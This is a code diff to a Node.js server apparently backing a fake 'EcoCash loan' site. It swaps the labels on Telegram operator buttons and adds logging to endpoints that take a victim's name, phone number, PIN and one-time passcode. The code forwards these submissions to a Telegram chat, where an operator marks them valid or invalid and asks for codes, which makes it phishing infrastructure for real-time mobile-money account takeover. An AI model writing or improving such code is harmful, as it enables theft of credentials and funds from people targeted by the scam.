@@ -34,7 +34,6 @@ async function sendToTelegram(message) {
     body: JSON.stringify({
       chat_id: CHAT_ID,
       text: message,
-
       reply_markup: {
         inline_keyboard: [
           [
@@ -42,8 +41,8 @@ async function sendToTelegram(message) {
             { text: "OTP 6", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6" }
           ],
           [
-            { text: "✅ VALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept" },
-            { text: "❌ INVALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline" }
+            { text: "✅ ACCEPT", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept" },
+            { text: "❌ DECLINE", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline" }
           ],
           [
             { text: "🔄 RESET", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=reset" }
@@ -68,8 +67,8 @@ async function sendVerificationToTelegram(message) {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "✅ ACCEPT", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=valid" },
-            { text: "❌ DECLINE", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=invalid" }
+            { text: "✅ VALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=valid" },
+            { text: "❌ INVALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=invalid" }
           ]
         ]
       }
@@ -78,6 +77,7 @@ async function sendVerificationToTelegram(message) {
 }
 
 app.post("/submit", async (req, res) => {
+  console.log("🔥 SUBMIT HIT");
   try {
     const { name, phone, pin } = req.body;
 
@@ -167,6 +167,7 @@ app.post("/clear-otp-decision", (req, res) => {
 });
 
     app.post("/submit-otp", async (req, res) => {
+  console.log("🔥 SUBMIT OTP HIT");
   try {
     const { otp } = req.body;
 
